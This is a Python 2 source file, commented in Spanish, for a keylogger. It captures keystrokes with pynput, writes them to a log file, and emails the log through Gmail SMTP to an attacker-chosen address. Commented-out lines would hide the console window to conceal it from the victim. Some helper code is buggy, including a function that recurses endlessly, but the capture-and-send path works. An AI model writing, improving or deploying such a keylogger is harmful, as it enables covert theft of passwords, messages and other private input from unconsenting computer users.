#!/usr/bin/env python
#_*_coding: utf8 _*_

import pynput.keyboard
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText 
#import win32console
#import win32gui

#ventana = win32console.GetConsoleWindow()
#win32gui.ShowWindows(ventana,0)

log_file = open('log.txt','w+')
def enviarDatos():
	msg = MIMEMultipart()
	password = "Lacontraseña"
	msg['From'] = "Tucorreo@gmail.com"
	msg['To'] = "Quienrecibe@gmail.com"
	msg['Subject'] = " Teclas capturadas"
	msg.attach(MIMEText(file('log.txt').read()))

	try: 
		server = smtplib.SMTP('smtp.gmail.com:587')
		server.starttls()
		server.login(msg['From'],password)
		server.sendmail(msg['From'],msg['To'],msg.as_string())
		server.quit()

	except:
		pass

def imprimir():
	teclas = ''.join(lista_tecla)
	log_file.write(teclas)
	log_file.write('\n')
	log_file.close()
	time.sleep(3)
	enviarDatos()

lista_tecla = []

def convertir(key):
	if isinstance(key,pynput.keyboard.KeyCode):
		return key.char
	else:
		return str(key)
def ejecutaScript():
	enviarDatos()
	print 'Ejecutando script...'
	
	while True:
		ejecutaScript()
		time.sleep(15)

def presiona(key): #a,b,c,d,e,1,2,3(){[]}
	key1 = convertir(key)
	if key1 == "Key.cmd":
		print("Saliendo..")
		imprimir()
		return False
	elif key1 == "Key.space":
		lista_tecla.append(" ")
	elif key1 =="Key.enter":
		lista_tecla.append('\n')
	elif key1 == "Key.backspace":
		pass
	elif key1 == "Key.tab":
		pass
	elif key1 == "Key.shift":
		pass
	else:
		lista_tecla.append(key1)

with pynput.keyboard.Listener(on_press=presiona) as listen:
	listen.join()